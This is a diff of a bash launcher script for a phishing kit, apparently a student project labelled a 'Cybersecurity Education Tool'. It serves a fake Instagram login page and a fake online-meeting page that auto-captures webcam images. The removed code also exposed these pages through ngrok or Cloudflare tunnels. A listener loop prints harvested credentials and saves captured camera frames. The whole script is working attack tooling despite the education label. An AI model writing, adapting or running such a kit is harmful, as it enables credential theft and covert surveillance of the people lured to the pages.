@@ -1,225 +1,89 @@
 #!/bin/bash
 
+# --- Color Definitions ---
+R='\033[1;31m'  # Red
+G='\033[1;32m'  # Green
+Y='\033[1;33m'  # Yellow
+B='\033[1;34m'  # Blue
+P='\033[1;35m'  # Purple
+C='\033[1;36m'  # Cyan
+W='\033[1;37m'  # White
+NC='\033[0m'     # No Color
+
+# Clean Terminal on Start
 clear
 
-# colors
-red="\e[31m"
-green="\e[32m"
-cyan="\e[36m"
-yellow="\e[33m"
-reset="\e[0m"
-
-###################################
-# dependency checker
-###################################
-
-check_command () {
-
-    if ! command -v $1 &> /dev/null
-    then
-        echo -e "${red}$1 not found! installing...${reset}"
-
-        sudo apt update > /dev/null 2>&1
-        sudo apt install $2 -y > /dev/null 2>&1
-    else
-        echo -e "${green}$1 found${reset}"
-    fi
-
-}
-
-###################################
-# check required packages
-###################################
-
-echo -e "${cyan}Checking dependencies...${reset}"
-
-check_command php php
-check_command curl curl
-check_command unzip unzip
-check_command wget wget
-
-###################################
-# check ngrok
-###################################
-
-if [ ! -f "./ngrok" ]; then
-
-    echo -e "${yellow}ngrok not found, downloading...${reset}"
-
-    wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
-    unzip ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
-    rm ngrok-v3-stable-linux-amd64.zip
-
-    chmod +x ngrok
-
-fi
-
-
-###################################
-# check cloudflared
-###################################
-
-if ! command -v cloudflared &> /dev/null
-then
-
-    echo -e "${yellow}cloudflared not found, installing...${reset}"
-
-    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb > /dev/null 2>&1
-
-    sudo dpkg -i cloudflared-linux-amd64.deb > /dev/null 2>&1
-
-    rm cloudflared-linux-amd64.deb
-
-fi
-
-
-###################################
-# banner
-###################################
-
-clear
-
-echo -e "${cyan}"
-echo "██████████████████████████████"
-echo "        Techyfatcat"
-echo "██████████████████████████████"
-echo -e "${reset}"
-
-sleep 1
-
-
-###################################
-# module select
-###################################
-
-echo -e "${yellow}Select Module:${reset}"
-
-echo "1. Instagram Page"
-echo "2. Meeting Page"
-echo "3. Exit"
-
-read -p "Enter choice: " module
-
-
-case $module in
-
-1)
-    folder="modules/insta"
-    ;;
-
-2)
-    folder="modules/meeting"
-    ;;
-
-3)
-    exit
-    ;;
-
-*)
-    echo -e "${red}Invalid option${reset}"
-    exit
-    ;;
-
-esac
-
-
-###################################
-# hosting select
-###################################
-
-echo
-
-echo -e "${yellow}Select Hosting Method:${reset}"
-
-echo "1. Localhost"
-echo "2. Ngrok"
-echo "3. Cloudflare"
-
-read -p "Enter choice: " host
-
-
-###################################
-# start php server
-###################################
-
-echo
-
-echo -e "${green}Starting PHP server...${reset}"
-
-php -S 127.0.0.1:8080 -t $folder &
-
-server_pid=$!
-
-sleep 3
-
-
-###################################
-# localhost
-###################################
-
-if [ "$host" = "1" ]; then
-
-    echo
-    echo -e "${cyan}Local URL:${reset}"
-    echo "http://127.0.0.1:8080"
-
-
-###################################
-# ngrok
-###################################
-
-elif [ "$host" = "2" ]; then
-
-    echo
-    echo -e "${green}Starting Ngrok tunnel...${reset}"
-
-    ./ngrok http 8080 > /dev/null 2>&1 &
-
-    sleep 6
-
-    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')
-
-    echo
-    echo -e "${cyan}Ngrok URL:${reset}"
-    echo $link
-
-
-###################################
-# cloudflare
-###################################
-
-elif [ "$host" = "3" ]; then
-
-    echo
-    echo -e "${green}Starting Cloudflare tunnel...${reset}"
-
-    cloudflared tunnel --url http://127.0.0.1:8080 > cf.log 2>&1 &
-
-    sleep 8
-
-    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cf.log)
-
-    echo
-    echo -e "${cyan}Cloudflare URL:${reset}"
-    echo $link
-
-
+# --- Bold Professional Branding ---
+echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+echo -e "  ${C}TECHYFATCAT ${NC}─ ${W}Cybersecurity Education Tool v2.0${NC}"
+echo -e "  ${Y}Developer: ${NC}${G}Aadit Sarhadi${NC} | ${P}CSE 2nd Year${NC}"
+echo -e "  ${W}GitHub:    ${NC}${B}techyfatcat${NC}"
+echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+echo -e "  ${R}[!] Press CTRL+C to stop the tool at any time${NC}"
+echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
+
+# --- Main Menu ---
+echo -e "${G}Select a Template:${NC}"
+echo -e "  ${B}[1]${NC} Instagram (Latest Dark UI)"
+echo -e "  ${B}[2]${NC} Online Meeting (Auto-Capture Image)"
+read -p "  Selection > " option
+
+echo -e "\n${G}Select Tunneling Method:${NC}"
+echo -e "  ${B}[1]${NC} Localhost (Port 8080)"
+echo -e "  ${B}[2]${NC} Cloudflare"
+echo -e "  ${B}[3]${NC} Ngrok"
+read -p "  Selection > " tunnel
+
+# --- Setup Paths & Clean Old Processes ---
+if [[ $option == "1" ]]; then
+    target_dir="modules/insta"
+    log_file="logs/output.txt"
+    echo -e "\n${Y}[*] Configuring Instagram Template...${NC}"
+elif [[ $option == "2" ]]; then
+    target_dir="modules/meeting"
+    log_file="logs/cam"
+    echo -e "\n${Y}[*] Configuring Meeting Template...${NC}"
 else
-
-    echo -e "${red}Invalid option${reset}"
-
-    kill $server_pid
-
-    exit
-
+    echo -e "${R}[!] Invalid Option. Exiting.${NC}"
+    exit 1
 fi
 
+# Kill any existing PHP server on 8080
+fuser -k 8080/tcp > /dev/null 2>&1
 
-###################################
-# finish
-###################################
+# --- Launch Server ---
+echo -e "${Y}[*] Starting PHP Server...${NC}"
+cd $target_dir
+php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+echo -e "${G}[+] Server Live at: ${W}http://127.0.0.1:8080${NC}"
 
-echo
-echo -e "${yellow}Press CTRL + C to stop server${reset}"
+# Go back to root for log monitoring
+cd ../..
 
-wait
+echo -e "${C}[*] Waiting for incoming data...${NC}\n"
+
+# --- Listener Loop ---
+while true; do
+    if [[ $option == "1" ]]; then
+        # Check for Credentials
+        if [[ -s logs/output.txt ]]; then
+            echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            echo -e "  ${G}[SUCCESS] CREDENTIALS RECEIVED!${NC}"
+            cat logs/output.txt
+            echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            # Clear file to prevent duplicate alerts
+            > logs/output.txt
+            echo -e "${Y}[*] Continuing listener...${NC}\n"
+        fi
+    elif [[ $option == "2" ]]; then
+        # Check for Images
+        count=$(ls -1 logs/cam/*.png 2>/dev/null | wc -l)
+        if [ $count -gt 0 ]; then
+            echo -e "  ${C}[IMAGE RECEIVED]${NC} Frame captured and saved in ${W}logs/cam/${NC}"
+            # Move to subfolder to acknowledge
+            mkdir -p logs/cam/received
+            mv logs/cam/*.png logs/cam/received/ 2>/dev/null
+        fi
+    fi
+    sleep 2
+done
